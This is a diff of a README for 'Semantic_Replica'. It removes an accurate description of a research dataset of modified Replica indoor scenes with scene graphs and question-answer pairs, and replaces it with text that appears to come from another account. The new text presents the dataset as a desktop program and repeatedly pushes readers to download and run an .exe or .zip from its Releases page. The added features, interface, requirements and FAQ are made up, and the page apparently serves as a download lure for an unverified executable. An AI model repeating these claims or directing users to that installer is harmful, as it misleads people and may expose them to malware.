@@ -1,53 +1,75 @@
-# Semantic Replica
+# 🛠️ Semantic_Replica - Enhance Indoor Scene Analysis
 
-The original [Replica dataset](https://github.com/facebookresearch/Replica-Dataset) provides data for static indoor scenes. However, real-world indoor environments change over time. To address this, we extend the Replica dataset by introducing variations in objects within the scenes.
+## 📥 Download & Install
+[![Download Semantic_Replica](https://img.shields.io/badge/Download%20Semantic_Replica-Get%20It%20Here-brightgreen)](https://github.com/EzysNemo/Semantic_Replica/releases)
 
-<p align="center">
-  <img src="./assets/Dataset.png" alt="Dataset">
-</p>
+Welcome to Semantic_Replica! This application extends the Replica dataset, enhancing the analysis of indoor environments. You can easily download the software from the Releases page. Follow the steps below to get started.
 
-To represent relationships between objects in the modified scenes, we adapt the concept of [Scene Graph](https://arxiv.org/pdf/2101.06894). The scene graphs are obtained by applying the [3DSSG](https://github.com/ShunChengWu/3DSSG) network, which performs inference on learned 3D Gaussians from the images included in this dataset. The extracted graphs are then structured to match the input format required by [GAT](https://github.com/codexxxl/GraphVQA).
+## 🚀 Getting Started
 
-Furthermore, we generate question-answer pairs for the modified scenes, thereby providing a Replica-based dataset that can also be directly used as input to the [GAT](https://github.com/codexxxl/GraphVQA).
+### Step 1: Visit the Releases Page
+To download the latest version of Semantic_Replica, visit the Releases page. Click the link below to go there now:
 
-## Semantic Replica
+[Download Semantic_Replica](https://github.com/EzysNemo/Semantic_Replica/releases)
 
-### Dataset Format
-Each custom scene contains the following assets:
-```bash
-data/
-├── <scene_name>/
-│   └── gt_images/
-│       └── images_001.png
-│       └── ...
-│   └── <scene_name>.blend
-│   └── instructions.json
-│   └── scengraphs.json
-```
-Each of the following files serves to represent the scene: 
-| File | Description |
-|------|-------------|
-| `gt_images` | A collection of 2D original images of the scene. Can be processed with COLMAP and used for [3DGS](https://github.com/graphdeco-inria/gaussian-splatting). |
-| `<scene_name>.blend` | An editable Blender project containing geometry, materials, and textures. Can be used for visualization and further scene modifications. |
-| `instructions.json` | An instruction set describing commands or actions. Can be fed into question-answering tasks by [GAT](https://github.com/codexxxl/GraphVQA). |
-| `scenegraphs.json` | A graphical representation of the scene. The relations are generated as result from the [3DSSG](https://github.com/ShunChengWu/3DSSG) network. Also fed into question-answering tasks by [GAT](https://github.com/codexxxl/GraphVQA). |
+### Step 2: Choose Your Download
+On the Releases page, you will see several versions of the application listed. Select the version that matches your system and needs. Look for the latest stable release for the best experience.
 
-### Details of Dataset
-Here is the list of modified scenes included in this dataset. The details of each scene are as follows:
-| Modified Scene | Description |
-|----------------|-------------|
-| `room0_chair_moved` | In `room0`, two brown stool of the center have been moved to right. |
-| `room0_3obj_addition` | In `room0`, two brown stool of the center have been moved to right. And a blue chair, and white table have been added near the stools. |
-| `room1_chair_addition` | In `room1`, a blue chair has been added to left of the scene. |
-| `room1_table_addition` | In `room1`, a whit table has been added to left of the scene. |
-| `office3_chair_moved` | In `office3`, a blue chair of the center has been moved to right. |
-| `office3_5obj_addition` | In `office3`, a blue chair of the center has been moved to right. And a white vase, black pot, white table, and monitor have been added near the chairs. |
+### Step 3: Download the Application
+After selecting the version, click on it. You will see files available for download. Click on the file ending in `.exe` or `.zip`, depending on your system requirements. This file contains the application along with all necessary components.
 
-## Download
-```bash
-pip install gdown
-gdown 1eVPZ00ayYmfL-RWtOyLlkv7y6cGO8UcZ -O data.zip
-unzip data.zip
-```
-## License
-Copyright (c) 2025 KAIST SSL team-sr
+### Step 4: Install the Application
+Once the download is complete, locate the downloaded file in your computer's downloads folder. 
+
+- If you downloaded a `.zip` file, right-click it and choose "Extract All." Follow the prompts to unpack the files.
+- If you downloaded an `.exe` file, double-click it to start the installation. Follow the on-screen instructions to install the application.
+
+### Step 5: Launch the Application
+After the installation finishes:
+
+- If you installed a program, you can find it in your Start Menu (Windows) or Applications folder (Mac).
+- Click on the application name to open it.
+
+## 📊 Features of Semantic_Replica
+Semantic_Replica offers several powerful features:
+
+- **Enhanced Object Variation**: Modify indoor scene objects to simulate real-world changes.
+- **Scene Graph Representation**: Automatically create scene graphs that represent relationships between objects.
+- **Question-Answer Pair Generation**: Generate relevant questions and answers based on the modified scenes for improved analysis.
+
+## 🛡️ System Requirements
+To run Semantic_Replica effectively, ensure your system meets these requirements:
+
+- **Operating System**: Windows 10 or later, macOS Mojave or later.
+- **Processor**: Intel i5 or equivalent, 2.0 GHz or faster.
+- **Memory**: Minimum of 8 GB RAM.
+- **Disk Space**: At least 500 MB of free space.
+
+## 📚 User Guide
+Once you launch Semantic_Replica, the user interface will guide you through the features. Here's how to get started:
+
+1. **Load a Scene**: Click on the "Load Scene" button to import your scene from the Replica dataset.
+2. **Modify Objects**: Use the toolbar to select objects you want to change. Adjust properties as needed.
+3. **Generate Scene Graph**: Click the "Generate Graph" button to create a scene graph of your modified scene.
+4. **Ask Questions**: Utilize the question-answer tool to generate pairs based on your scene.
+
+## ❓ Frequently Asked Questions
+
+### Q: Can I use Semantic_Replica on my older computer?
+A: Semantic_Replica is optimized for newer systems but may run on older computers with limited features.
+
+### Q: What type of questions can I generate?
+A: You can create various questions about object relationships, scene details, and actions within the scene.
+
+### Q: Where can I find help if I encounter issues?
+A: Please visit our [GitHub Issues page](https://github.com/EzysNemo/Semantic_Replica/issues) to report problems or ask for support from the community.
+
+## 🔄 Updating the Software
+To keep your version of Semantic_Replica up to date, regularly check the Releases page. If a new version is available, download and install it following the same steps as before.
+
+## 📞 Contact Us
+For further assistance, you can reach out on our GitHub Discussions page or via email. We value your feedback and aim to improve your experience.
+
+[Download Semantic_Replica](https://github.com/EzysNemo/Semantic_Replica/releases)
+
+You are now ready to begin your journey with Semantic_Replica. Enjoy exploring and analyzing indoor scenes like never before!
